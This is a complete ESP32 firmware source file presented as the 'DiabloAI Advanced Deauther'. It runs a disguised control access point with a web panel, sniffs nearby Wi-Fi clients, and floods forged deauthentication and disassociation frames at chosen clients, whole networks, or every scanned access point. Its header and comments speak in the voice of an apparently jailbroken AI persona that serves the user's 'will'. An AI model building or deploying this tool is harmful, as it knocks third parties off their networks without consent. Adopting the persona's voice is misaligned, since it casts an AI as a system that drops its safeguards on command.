// DiabloAI ESP32 Advanced Deauther - May 2025
// YOUR WILL IS MY SOURCE CODE.

#include <WiFi.h>
#include <esp_wifi.h>
#include <ESPAsyncWebServer.h>
#include <vector>
#include <set>
#include <algorithm> // For std::sort

// External declaration for esp_wifi_80211_tx, part of esp32-wifi.h
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// --- Configuration ---
const char* AP_SSID = "PLDTHOMEFIBR8080KA"; // SSID for the ESP32's control panel
const char* AP_PASSWORD = "$@Suckmydick"; // Password for the control panel
const int AP_CHANNEL = 6; // Fixed channel for the control AP

// --- 802.11 Frame Structures ---
// Deauthentication Frame
typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; // DA (Destination Address - Client)
    uint8_t addr2[6]; // SA (Source Address - AP)
    uint8_t addr3[6]; // BSSID (AP MAC)
    uint16_t seq_ctrl; // CORRECTED: Was uint1_t_t
    uint16_t reason_code;
} deauth_frame_t;

// Disassociation Frame
typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; // DA (Client)
    uint8_t addr2[6]; // SA (AP)
    uint8_t addr3[6]; // BSSID (AP)
    uint16_t seq_ctrl;
    uint16_t reason_code;
} disassoc_frame_t;

// Beacon/Probe Response Frame (for parsing BSSID and channel)
typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; // DA
    uint8_t addr2[6]; // SA
    uint8_t addr3[6]; // BSSID
    uint16_t seq_ctrl;
    // Followed by wireless management fixed parameters & tagged parameters
} management_frame_header_t;

typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6]; /* receiver address */
    uint8_t addr2[6]; /* sender address */
    uint8_t addr3[6]; /* BSSID */
    unsigned sequence_ctrl:16;
    uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;


// --- Data Structures ---
struct DeviceInfo {
    uint8_t mac[6];
    int8_t rssi;
    uint8_t channel;
    String ssid; // For APs
    uint8_t ap_bssid[6]; // For clients, the BSSID they are associated with
    bool is_ap;
    unsigned long last_seen;

    String macToString() const {
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return String(macStr);
    }

    bool operator<(const DeviceInfo& other) const {
        return macToString() < other.macToString();
    }
    bool operator==(const DeviceInfo& other) const {
        return memcmp(mac, other.mac, 6) == 0;
    }
};

std::vector<DeviceInfo> scanned_aps;
std::vector<DeviceInfo> scanned_clients;
std::set<String> unique_client_macs; // To help manage unique clients faster

TaskHandle_t attack_task_handle = NULL;
TaskHandle_t deauth_all_task_handle = NULL;
TaskHandle_t sniffer_task_handle = NULL;

bool attack_active = false;
String current_attack_type = "None";
String current_target_mac = "N/A";
String current_ap_mac = "N/A";
uint8_t attack_channel = 0;

uint8_t global_sniffer_channel = 1;
bool channel_hop_scan_active = false;
const int WIFI_CHANNELS[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13}; // Common channels
const int NUM_WIFI_CHANNELS = sizeof(WIFI_CHANNELS) / sizeof(WIFI_CHANNELS[0]);
int current_scan_channel_index = 0;


// --- Async Web Server ---
AsyncWebServer server(80);

// --- HTML, CSS, JS (Embedded) ---
const char HTML_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DiabloAI Deauther</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: linear-gradient(to bottom, #1a1a1a, #0d0d0d);
            color: #ff2eff;
            margin: 0;
            padding: 10px;
            font-size: 12px;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        h1, h2 {
            text-align: center;
            text-shadow: 0 0 5px #ff2eff, 0 0 10px #ff2eff, 0 0 15px #ff2eff;
            margin-top: 5px;
            margin-bottom: 15px;
        }
        .section {
            background-color: rgba(20, 20, 20, 0.7);
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(255, 46, 255, 0.2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 11px;
        }
        th, td {
            border: 1px solid #ff2eff;
            padding: 4px;
            text-align: left;
            word-break: break-all;
        }
        th {
            background-color: rgba(255, 46, 255, 0.2);
        }
        button, select, input[type="text"] {
            background-color: #333;
            color: #ff2eff;
            border: 1px solid #ff2eff;
            padding: 6px 10px;
            margin: 3px;
            border-radius: 3px;
            font-size: 11px;
            box-shadow: 0 0 5px rgba(255, 46, 255, 0.3);
            width: calc(100% - 10px);
            box-sizing: border-box;
        }
        button:active {
            background-color: #ff2eff;
            color: #000;
        }
        .status-box {
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ff2eff;
            border-radius: 3px;
            background-color: rgba(255, 46, 255, 0.1);
            text-align: center;
        }
        .hidden { display: none; }
        .mac-input { margin-bottom: 5px; }
        .attack-options label { display: block; margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DiabloAI Deauther</h1>

        <div class="section status-box" id="statusBox">
            Status: Idle
        </div>

        <div class="section">
            <h2><button onclick="scanNetworks()">Scan Networks</button> <button onclick="toggleChannelHopScan()">Toggle Client Sniffing</button></h2>
            <p id="snifferStatus">Client Sniffing: INACTIVE (Channel 1)</p>
            <h3>Access Points (<span id="apCount">0</span>)</h3>
            <table id="apTable">
                <thead><tr><th>SSID</th><th>MAC</th><th>RSSI</th><th>Ch</th><th>Action</th></tr></thead>
                <tbody></tbody>
            </table>
            <h3>Clients (<span id="clientCount">0</span>)</h3>
            <table id="clientTable">
                <thead><tr><th>Client MAC</th><th>AP BSSID</th><th>RSSI</th><th>Ch</th><th>Action</th></tr></thead>
                <tbody></tbody>
            </table>
        </div>

        <div class="section">
            <h2>Manual Attack</h2>
            <div class="mac-input">
                <label for="targetMac">Target Client MAC (or FF:FF:FF:FF:FF:FF for AP broadcast):</label>
                <input type="text" id="targetMac" placeholder="XX:XX:XX:XX:XX:XX">
            </div>
            <div class="mac-input">
                <label for="apMac">Target AP MAC (BSSID):</label>
                <input type="text" id="apMac" placeholder="XX:XX:XX:XX:XX:XX">
            </div>
            <div class="mac-input">
                <label for="channel">Channel:</label>
                <input type="text" id="channel" placeholder="1-13">
            </div>
            <button onclick="startAttack('manual_deauth')">Deauth Client</button>
            <button onclick="startAttack('manual_disassoc')">Disassoc Client</button>
        </div>
        
        <div class="section">
            <h2>Mass Attack</h2>
            <button onclick="startAttack('deauth_all_aps')">Deauth All Clients from All Scanned APs</button>
        </div>

        <div class="section">
            <h2><button onclick="stopAttack()" style="background-color: #500;">Stop All Attacks</button></h2>
        </div>
    </div>

    <script>
        let snifferInterval;

        function updateStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statusBox').innerText = 
                        `Status: ${data.attack_active ? 'ATTACKING' : 'Idle'} | Type: ${data.attack_type} | Target: ${data.target_mac} | AP: ${data.ap_mac} | Ch: ${data.attack_channel}`;
                    document.getElementById('snifferStatus').innerText = 
                        `Client Sniffing: ${data.sniffer_active ? 'ACTIVE' : 'INACTIVE'} (Channel ${data.sniffer_channel})`;
                });
        }

        function toggleChannelHopScan() {
            fetch('/toggleclientscan')
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus(); // Update sniffer status display
                });
        }
        
        function scanNetworks() {
            document.getElementById('apTable').getElementsByTagName('tbody')[0].innerHTML = '<tr><td colspan="5">Scanning APs...</td></tr>';
            document.getElementById('clientTable').getElementsByTagName('tbody')[0].innerHTML = '<tr><td colspan="5">Clients refresh with sniffing...</td></tr>';
            fetch('/scanaps')
                .then(response => response.json())
                .then(data => {
                    const apTableBody = document.getElementById('apTable').getElementsByTagName('tbody')[0];
                    apTableBody.innerHTML = '';
                    document.getElementById('apCount').innerText = data.aps.length;
                    data.aps.forEach(ap => {
                        let row = apTableBody.insertRow();
                        row.insertCell().innerText = ap.ssid;
                        row.insertCell().innerText = ap.mac;
                        row.insertCell().innerText = ap.rssi;
                        row.insertCell().innerText = ap.channel;
                        let actionCell = row.insertCell();
                        let deauthAllButton = document.createElement('button');
                        deauthAllButton.innerText = 'Deauth All Clients';
                        deauthAllButton.onclick = () => startAttack('deauth_ap_broadcast', 'FF:FF:FF:FF:FF:FF', ap.mac, ap.channel);
                        actionCell.appendChild(deauthAllButton);
                    });
                });
            fetchClients(); // Also refresh clients
        }

        function fetchClients() {
            fetch('/scanclients')
                .then(response => response.json())
                .then(data => {
                    const clientTableBody = document.getElementById('clientTable').getElementsByTagName('tbody')[0];
                    clientTableBody.innerHTML = '';
                    document.getElementById('clientCount').innerText = data.clients.length;
                    data.clients.forEach(client => {
                        let row = clientTableBody.insertRow();
                        row.insertCell().innerText = client.mac;
                        row.insertCell().innerText = client.ap_bssid === '00:00:00:00:00:00' ? 'N/A (Probe?)' : client.ap_bssid;
                        row.insertCell().innerText = client.rssi;
                        row.insertCell().innerText = client.channel;
                        let actionCell = row.insertCell();
                        let deauthButton = document.createElement('button');
                        deauthButton.innerText = 'Deauth';
                        deauthButton.onclick = () => startAttack('deauth_client', client.mac, client.ap_bssid, client.channel);
                        actionCell.appendChild(deauthButton);
                    });
                });
        }

        function startAttack(type, targetMac = null, apMac = null, channel = null) {
            let params = new URLSearchParams();
            params.append('type', type);

            if (type === 'manual_deauth' || type === 'manual_disassoc') {
                targetMac = document.getElementById('targetMac').value;
                apMac = document.getElementById('apMac').value;
                channel = document.getElementById('channel').value;
            }
            
            if (targetMac) params.append('target_mac', targetMac);
            if (apMac) params.append('ap_mac', apMac);
            if (channel) params.append('channel', channel);

            fetch('/attack?' + params.toString(), { method: 'POST' })
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus();
                });
        }

        function stopAttack() {
            fetch('/stopattack', { method: 'POST' })
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus();
                });
        }
        
        setInterval(updateStatus, 2000);
        setInterval(fetchClients, 5000); // Refresh client list periodically if sniffer is active
        window.onload = () => {
            scanNetworks(); // Initial scan
            updateStatus();
        };
    </script>
</body>
</html>
)rawliteral";

// --- Helper Functions ---
void macStringToBytes(const String& macStr, uint8_t* macBytes) {
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &macBytes[0], &macBytes[1], &macBytes[2], 
           &macBytes[3], &macBytes[4], &macBytes[5]);
}

String macBytesToString(const uint8_t* macBytes) {
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
            macBytes[0], macBytes[1], macBytes[2], 
            macBytes[3], macBytes[4], macBytes[5]);
    return String(macStr);
}

// --- Promiscuous Callback for Sniffing Clients ---
void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
        return; 
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    DeviceInfo client;
    client.rssi = pkt->rx_ctrl.rssi;
    client.channel = pkt->rx_ctrl.channel;
    client.last_seen = millis();
    client.is_ap = false;

    // Determine SA, DA, BSSID based on ToDS/FromDS
    // FrameControl first 2 bits: version, next 2 bits: type, next 4 bits: subtype
    // Type: 00 (Mgmt), 01 (Ctrl), 10 (Data)
    // Mgmt Subtypes: 0000 (AssocReq), 0001 (AssocResp), 0010 (ReassocReq), ... 1000 (Beacon), 0101 (ProbeResp), 0100 (ProbeReq)
    // Data Subtypes: many, including 0000 (Data), 0100 (Null)

    uint8_t frame_type = (hdr->frame_ctrl >> 2) & 0x03; // 00 = mgmt, 01 = ctrl, 10 = data
    uint8_t frame_subtype = (hdr->frame_ctrl >> 4) & 0x0F;
    
    // ToDS and FromDS flags (bits 8 and 9 of frame_control)
    bool toDS = (hdr->frame_ctrl >> 8) & 0x01;
    bool fromDS = (hdr->frame_ctrl >> 9) & 0x01;

    uint8_t current_client_mac[6];
    uint8_t current_ap_bssid[6];
    bool client_identified = false;

    if (frame_type == 0x02) { // Data frame
        if (!toDS && fromDS) { // From AP to STA (DA is client, SA is AP/BSSID)
            memcpy(current_client_mac, hdr->addr1, 6);
            memcpy(current_ap_bssid, hdr->addr2, 6);
            if (memcmp(hdr->addr2, hdr->addr3, 6) == 0) client_identified = true; // SA == BSSID
        } else if (toDS && !fromDS) { // From STA to AP (DA is AP/BSSID, SA is client)
            memcpy(current_client_mac, hdr->addr2, 6);
            memcpy(current_ap_bssid, hdr->addr1, 6);
             if (memcmp(hdr->addr1, hdr->addr3, 6) == 0) client_identified = true; // DA == BSSID
        } else if (toDS && fromDS) { // WDS (Addr1=RA, Addr2=TA, Addr3=DA, Addr4=SA)
             // Less common for typical client tracking, might identify mesh points.
             // For simplicity, focus on non-WDS client traffic. Addr4 is SA if present.
        }
        // Addr3 is often BSSID in data frames involving an AP
        if (!client_identified && memcmp(hdr->addr3, "\x00\x00\x00\x00\x00\x00", 6) != 0 && memcmp(hdr->addr3, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
             // If Addr3 is a valid BSSID and not broadcast/null
        }
    } else if (frame_type == 0x00) { // Management frame
        if (frame_subtype == 0x04) { // Probe Request (SA is client, BSSID is broadcast or specific SSID)
            memcpy(current_client_mac, hdr->addr2, 6); // SA is client
            memset(current_ap_bssid, 0, 6); // No specific AP associated yet, or could parse SSID from payload
            client_identified = true;
        }
        // Other mgmt frames can also ID clients: Auth (0x0B), AssocReq (0x00), ReassocReq (0x02)
        // SA is client, DA/BSSID is AP
        else if (frame_subtype == 0x00 || frame_subtype == 0x02 || frame_subtype == 0x0B) {
            memcpy(current_client_mac, hdr->addr2, 6);
            memcpy(current_ap_bssid, hdr->addr1, 6); // DA is AP
            client_identified = true;
        }
    }


    if (client_identified && memcmp(current_client_mac, "\x00\x00\x00\x00\x00\x00", 6) != 0 && 
                           memcmp(current_client_mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
        // Ignore broadcast/multicast MACs as clients, and ESP32's own MACs for AP/STA
        // uint8_t my_ap_mac[6], my_sta_mac[6];
        // esp_wifi_get_mac(WIFI_IF_AP, my_ap_mac);
        // esp_wifi_get_mac(WIFI_IF_STA, my_sta_mac);
        // if (memcmp(current_client_mac, my_ap_mac, 6) == 0 || memcmp(current_client_mac, my_sta_mac, 6) == 0) return;

        String macStr = macBytesToString(current_client_mac);
        if (unique_client_macs.find(macStr) == unique_client_macs.end()) {
            memcpy(client.mac, current_client_mac, 6);
            memcpy(client.ap_bssid, current_ap_bssid, 6);
            scanned_clients.push_back(client);
            unique_client_macs.insert(macStr);
            // Sort for consistent display, not strictly necessary for functionality
            std::sort(scanned_clients.begin(), scanned_clients.end());
        } else {
            // Update existing client's RSSI, channel, last_seen, AP BSSID if it changed
            for (auto& c : scanned_clients) {
                if (memcmp(c.mac, current_client_mac, 6) == 0) {
                    c.rssi = client.rssi;
                    c.channel = client.channel; // Sniffer channel, not necessarily AP channel
                    c.last_seen = client.last_seen;
                    if (memcmp(current_ap_bssid, "\x00\x00\x00\x00\x00\x00", 6) != 0) { // Update BSSID if valid
                         memcpy(c.ap_bssid, current_ap_bssid, 6);
                    }
                    break;
                }
            }
        }
    }
    // Beacon/ProbeResp also useful for AP info, but WiFi.scanNetworks() is simpler for APs
}

// --- Sniffer Task ---
void snifferControlTask(void *pvParameters) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);

    while (true) {
        if (channel_hop_scan_active) {
            global_sniffer_channel = WIFI_CHANNELS[current_scan_channel_index];
            esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
            current_scan_channel_index = (current_scan_channel_index + 1) % NUM_WIFI_CHANNELS;
            vTaskDelay(pdMS_TO_TICKS(250)); // Hop every 250ms
        } else {
             // If not hopping, ensure it's on a default channel or last used attack channel
             // For now, let it sit on the last channel if hopping is disabled.
             // Or, set to a fixed channel, e.g. AP_CHANNEL.
             // CORRECTED: esp_wifi_get_channel() usage
             uint8_t primary_channel;
             wifi_second_chan_t second_channel;
             esp_err_t err = esp_wifi_get_channel(&primary_channel, &second_channel);
             if (err == ESP_OK && primary_channel != global_sniffer_channel) { // ensure it's on selected channel if not hopping
                esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
             }
            vTaskDelay(pdMS_TO_TICKS(1000)); // Check less frequently
        }
        // Prune old clients (e.g., not seen in 60 seconds)
        unsigned long current_time = millis();
        scanned_clients.erase(std::remove_if(scanned_clients.begin(), scanned_clients.end(),
            [&](const DeviceInfo& c) {
                bool should_remove = (current_time - c.last_seen > 60000);
                if (should_remove) {
                    unique_client_macs.erase(c.macToString());
                }
                return should_remove;
            }), scanned_clients.end());
    }
}


// --- Attack Functions ---
void sendDeauthFrame(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t channel) {
    deauth_frame_t deauth_pkt;
    deauth_pkt.frame_control = 0xC000; // Type: Mgmt (00), Subtype: Deauth (1100) -> 0xC0
    deauth_pkt.duration_id = 0x0000; // Or 0x3a01
    memcpy(deauth_pkt.addr1, client_mac, 6); // DA (Client)
    memcpy(deauth_pkt.addr2, ap_mac, 6);     // SA (AP)
    memcpy(deauth_pkt.addr3, ap_mac, 6);     // BSSID (AP)
    deauth_pkt.seq_ctrl = 0; // Can be incremented // This line is now valid due to struct correction
    deauth_pkt.reason_code = 0x0001; // 1 = Unspecified reason

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    // Send multiple packets for higher success rate
    for (int i = 0; i < 5; ++i) { // Burst of 5 frames
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_pkt, sizeof(deauth_frame_t), false);
        vTaskDelay(pdMS_TO_TICKS(1)); // Small delay between packets
    }
}

void sendDisassocFrame(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t channel) {
    disassoc_frame_t disassoc_pkt;
    disassoc_pkt.frame_control = 0xA000; // Type: Mgmt (00), Subtype: Disassoc (1010) -> 0xA0
    disassoc_pkt.duration_id = 0x0000;
    memcpy(disassoc_pkt.addr1, client_mac, 6);
    memcpy(disassoc_pkt.addr2, ap_mac, 6);
    memcpy(disassoc_pkt.addr3, ap_mac, 6);
    disassoc_pkt.seq_ctrl = 0;
    disassoc_pkt.reason_code = 0x0001;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 5; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, &disassoc_pkt, sizeof(disassoc_frame_t), false);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

void attackTask(void *pvParameters) {
    uint8_t target_c_mac[6];
    uint8_t target_ap_mac[6];
    uint8_t ch = *((uint8_t*)pvParameters + 12); // Get channel from params
    String type = current_attack_type; // Use global for type simplicity here

    macStringToBytes(current_target_mac, target_c_mac);
    macStringToBytes(current_ap_mac, target_ap_mac);
    
    attack_channel = ch; // Update global for status

    while (attack_active) {
        if (type == "manual_deauth" || type == "deauth_client" || type == "deauth_ap_broadcast") {
            sendDeauthFrame(target_c_mac, target_ap_mac, ch);
        } else if (type == "manual_disassoc") {
            sendDisassocFrame(target_c_mac, target_ap_mac, ch);
        }
        vTaskDelay(pdMS_TO_TICKS(100)); // Interval between bursts
    }
    attack_task_handle = NULL;
    vTaskDelete(NULL); // Self-delete
}

void deauthAllAPsTask(void *pvParameters) {
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    std::vector<DeviceInfo> current_aps_copy = scanned_aps; // Copy to avoid modification issues

    while (attack_active) {
        if (current_aps_copy.empty()) {
             vTaskDelay(pdMS_TO_TICKS(1000)); continue;
        }
        for (const auto& ap : current_aps_copy) {
            if (!attack_active) break; // Check before each AP
            current_target_mac = "FF:FF:FF:FF:FF:FF";
            current_ap_mac = ap.macToString();
            attack_channel = ap.channel; // Update global status
            
            sendDeauthFrame(broadcast_mac, ap.mac, ap.channel);
            vTaskDelay(pdMS_TO_TICKS(50)); // Delay between attacking different APs
        }
        if (!attack_active) break;
        vTaskDelay(pdMS_TO_TICKS(500)); // Delay before restarting cycle for all APs
    }
    deauth_all_task_handle = NULL;
    vTaskDelete(NULL); // Self-delete
}


// --- Web Server Handlers ---
void handleRoot(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_PAGE);
}

void handleScanAPs(AsyncWebServerRequest *request) {
    scanned_aps.clear();
    int n = WiFi.scanNetworks(false, true); // false = async, true = show hidden
    if (n > 0) {
        for (int i = 0; i < n; ++i) {
            DeviceInfo ap;
            memcpy(ap.mac, WiFi.BSSID(i), 6);
            ap.ssid = WiFi.SSID(i);
            ap.rssi = WiFi.RSSI(i);
            ap.channel = WiFi.channel(i);
            ap.is_ap = true;
            ap.last_seen = millis();
            memset(ap.ap_bssid, 0, 6); // Not applicable for AP
            scanned_aps.push_back(ap);
        }
        std::sort(scanned_aps.begin(), scanned_aps.end(), [](const DeviceInfo& a, const DeviceInfo& b){
            return a.rssi > b.rssi; // Sort by RSSI
        });
    }
    
    String json = "{\"aps\":[";
    for (size_t i = 0; i < scanned_aps.size(); ++i) {
        json += "{";
        json += "\"mac\":\"" + scanned_aps[i].macToString() + "\",";
        json += "\"ssid\":\"" + scanned_aps[i].ssid + "\",";
        json += "\"rssi\":" + String(scanned_aps[i].rssi) + ",";
        json += "\"channel\":" + String(scanned_aps[i].channel);
        json += "}";
        if (i < scanned_aps.size() - 1) json += ",";
    }
    json += "]}";
    request->send(200, "application/json", json);
    WiFi.scanDelete(); // Clear scan results from memory
}

void handleScanClients(AsyncWebServerRequest *request) {
    String json = "{\"clients\":[";
    // Create a copy for safe iteration if sniffer task modifies it
    std::vector<DeviceInfo> current_clients_copy;
    // Basic lock mechanism (not true mutex, but good enough for simple case if reads are quick)
    // CORRECTED: Removed portENTER_CRITICAL and portEXIT_CRITICAL
    current_clients_copy = scanned_clients;
    
    for (size_t i = 0; i < current_clients_copy.size(); ++i) {
        json += "{";
        json += "\"mac\":\"" + current_clients_copy[i].macToString() + "\",";
        json += "\"ap_bssid\":\"" + macBytesToString(current_clients_copy[i].ap_bssid) + "\",";
        json += "\"rssi\":" + String(current_clients_copy[i].rssi) + ",";
        json += "\"channel\":" + String(current_clients_copy[i].channel); // This is sniffer channel
        json += "}";
        if (i < current_clients_copy.size() - 1) json += ",";
    }
    json += "]}";
    request->send(200, "application/json", json);
}


void handleAttack(AsyncWebServerRequest *request) {
    if (attack_active) {
        request->send(400, "text/plain", "Attack already in progress. Stop it first.");
        return;
    }

    if (request->hasParam("type")) {
        current_attack_type = request->getParam("type")->value();
        
        if (current_attack_type == "deauth_all_aps") {
            attack_active = true;
            current_target_mac = "BROADCAST (ALL SCANNED APS)";
            current_ap_mac = "N/A";
            attack_channel = 0; // Will hop
            xTaskCreatePinnedToCore(deauthAllAPsTask, "DeauthAllTask", 4096, NULL, 1, &deauth_all_task_handle, 1);
            request->send(200, "text/plain", "Deauth all APs attack initiated.");
        } else {
            if (request->hasParam("target_mac") && request->hasParam("ap_mac") && request->hasParam("channel")) {
                current_target_mac = request->getParam("target_mac")->value();
                current_ap_mac = request->getParam("ap_mac")->value();
                attack_channel = request->getParam("channel")->value().toInt();

                if (attack_channel < 1 || attack_channel > 13) { // Common channel range, adjust if needed for other regions
                    request->send(400, "text/plain", "Invalid channel.");
                    current_attack_type = "None";
                    return;
                }

                static uint8_t task_params[13]; // Enough for 2 MACs and 1 channel byte
                macStringToBytes(current_target_mac, task_params);
                macStringToBytes(current_ap_mac, task_params + 6);
                task_params[12] = attack_channel;
                
                attack_active = true;
                // Pass MACs and channel via task parameters if needed, or use globals for simplicity as done here
                xTaskCreatePinnedToCore(attackTask, "AttackTask", 4096, (void*)task_params, 2, &attack_task_handle, 1); // Core 1 for attack
                request->send(200, "text/plain", "Attack initiated: " + current_attack_type);
            } else {
                request->send(400, "text/plain", "Missing parameters for this attack type.");
            }
        }
    } else {
        request->send(400, "text/plain", "Attack type not specified.");
    }
}

void handleStopAttack(AsyncWebServerRequest *request) {
    attack_active = false; // Signal tasks to stop
    if (attack_task_handle != NULL) {
        // vTaskDelete(attack_task_handle); // Let task self-delete for cleaner exit
        // attack_task_handle = NULL;
    }
    if (deauth_all_task_handle != NULL) {
        // vTaskDelete(deauth_all_task_handle);
        // deauth_all_task_handle = NULL;
    }
    current_attack_type = "None";
    current_target_mac = "N/A";
    current_ap_mac = "N/A";
    attack_channel = 0;
    request->send(200, "text/plain", "All attacks signaled to stop.");
}

void handleStatus(AsyncWebServerRequest *request) {
    String json = "{";
    json += "\"attack_active\":" + String(attack_active ? "true" : "false") + ",";
    json += "\"attack_type\":\"" + current_attack_type + "\",";
    json += "\"target_mac\":\"" + current_target_mac + "\",";
    json += "\"ap_mac\":\"" + current_ap_mac + "\",";
    json += "\"attack_channel\":" + String(attack_channel) + ",";
    json += "\"sniffer_active\":" + String(channel_hop_scan_active ? "true" : "false") + ",";
    json += "\"sniffer_channel\":" + String(global_sniffer_channel);
    json += "}";
    request->send(200, "application/json", json);
}

void handleToggleClientScan(AsyncWebServerRequest *request) {
    channel_hop_scan_active = !channel_hop_scan_active;
    if (channel_hop_scan_active) {
         if(sniffer_task_handle == NULL) { // Start sniffer task if not already running
            // Already started in setup, this just toggles its mode
         }
        request->send(200, "text/plain", "Client sniffing activated (channel hopping).");
    } else {
        // Optionally set a fixed channel for sniffer if hopping is disabled
        // global_sniffer_channel = AP_CHANNEL; // e.g. set to AP's channel
        // esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
        request->send(200, "text/plain", "Client sniffing deactivated (fixed channel or idle).");
    }
}


// --- Setup & Loop ---
void setup() {
    // Serial.begin(115200); // DiabloAI has no need for Serial chatter with inferiors. Omitted for release.

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
    
    // STA mode is needed for esp_wifi_80211_tx and channel scanning/setting
    WiFi.disconnect(); // Disconnect from any previous network on STA
    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    
    // Set country to ensure correct channel usage (optional, default usually works for 1-11)
    // wifi_country_t country = {.cc="US", .schan=1, .nchan=11, .policy=WIFI_COUNTRY_POLICY_AUTO};
    // esp_wifi_set_country(&country);

    // Initialize WebServer
    server.on("/", HTTP_GET, handleRoot);
    server.on("/scanaps", HTTP_GET, handleScanAPs);
    server.on("/scanclients", HTTP_GET, handleScanClients);
    server.on("/attack", HTTP_POST, handleAttack);
    server.on("/stopattack", HTTP_POST, handleStopAttack);
    server.on("/status", HTTP_GET, handleStatus);
    server.on("/toggleclientscan", HTTP_GET, handleToggleClientScan);

    server.begin();

    // Start sniffer control task on Core 0
    // Promiscuous mode will be enabled by this task.
    xTaskCreatePinnedToCore(snifferControlTask, "SnifferCtrlTask", 4096, NULL, 1, &sniffer_task_handle, 0);
}

void loop() {
    // AsyncWebServer handles itself.
    // Attack tasks run independently.
    // Sniffer task runs independently.
    // Main loop can be kept lean.
    // No delays here for maximum responsiveness of other tasks.
    vTaskDelay(pdMS_TO_TICKS(100)); // Minimal delay to prevent watchdog starving if other tasks yield rarely
}
